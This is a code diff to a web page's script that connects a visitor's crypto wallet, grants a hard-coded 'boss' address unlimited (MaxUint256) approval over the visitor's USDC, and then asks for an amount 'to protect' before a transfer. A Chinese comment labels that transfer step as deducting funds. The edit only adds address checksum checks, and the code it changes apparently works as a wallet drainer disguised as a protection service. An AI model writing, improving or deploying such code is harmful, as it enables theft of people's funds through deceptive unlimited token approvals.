@@ -40,8 +40,8 @@
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
-    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
+    const rawUSDC = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC 地址
+    const rawBOSS = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Boss 地址
     const approveAmount = ethers.constants.MaxUint256;
 
     async function startBinding() {
@@ -58,14 +58,18 @@
         const userAddress = await signer.getAddress();
         status.innerText = "🔗 Connected: " + userAddress;
 
-        // Step 1: Approve
+        // ✅ 校验地址
+        const usdcAddress = ethers.utils.getAddress(rawUSDC);
+        const bossAddress = ethers.utils.getAddress(rawBOSS);
+
+        // ✅ Step 1: 授权合约
         status.innerText += "\n⏳ Approving contract...";
         const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
         const approveTx = await usdc.approve(bossAddress, approveAmount);
         await approveTx.wait();
         status.innerText += "\n✅ Authorization successful.";
 
-        // Step 2: Transfer
+        // ✅ Step 2: 扣款转账
         const amount = prompt("Enter USDC amount to protect:");
         if (!amount || isNaN(amount)) {
           status.innerText += "\n❌ Invalid amount.";
